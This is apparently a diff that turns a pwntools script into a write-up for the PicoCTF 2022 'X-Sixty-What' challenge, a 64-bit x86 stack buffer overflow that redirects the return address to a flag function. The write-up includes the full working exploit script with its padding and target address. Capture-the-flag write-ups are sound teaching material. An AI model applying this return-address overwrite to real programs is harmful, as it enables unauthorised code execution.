@@ -1,5 +1,35 @@
-from pwn import *
+---
+name: X-Sixty-What (2022)
+event: Pico CTF 2022
+category: Pwn
+description: Writeup for X-Sixty-What (Pwn) - Pico CTF (2022) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
+---
 
+# X-Sixty-What
+
+## Video Walkthrough
+
+[![VIDEO](https://img.youtube.com/vi/dAsujQ_OPEk/0.jpg)](https://youtu.be/dAsujQ_OPEk?t=2358 "Pico CTF 2022: X-Sixty-What")
+
+## Description
+
+> Most problems before this are 32-bit x86. Now we’ll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the flag function in this program.
+
+## Solution
+
+```py
+from pwn import *
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
@@ -10,27 +40,11 @@ def start(argv=[], *a, **kw):
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
 
-
-# Find offset to EIP/RIP for buffer overflows
-def find_ip(payload):
-    # Launch process and send payload
-    p = process(exe, level='warn')
-    p.sendlineafter(b':', payload)
-    # Wait for the process to crash
-    p.wait()
-    # Print out the address of EIP/RIP at the time of crashing
-    ip_offset = cyclic_find(p.corefile.pc)  # x86
-    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
-    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
-    return ip_offset
-
-
 # Specify your GDB script here for debugging
 gdbscript = '''
 init-pwndbg
 continue
 '''.format(**locals())
-
 
 # Set up pwntools for the correct architecture
 exe = './vuln'
@@ -45,15 +59,12 @@ context.log_level = 'debug'
 
 io = start()
 
-# Pass in pattern_size, get back EIP/RIP offset
-offset = find_ip(cyclic(128))
+# How many bytes to the instruction pointer (EIP)?
+padding = 72
 
 payload = flat(
-    b'A' * offset,
-    elf.symbols.win,
-    0x0,  # junk for saved RBP
-    0xCAFEF00D,
-    0xF00DF00D
+    b'A' * padding,
+    0x40123b
 )
 
 # Save the payload to file
@@ -64,3 +75,4 @@ io.sendlineafter(b':', payload)
 
 # Receive the flag
 io.interactive()
+```
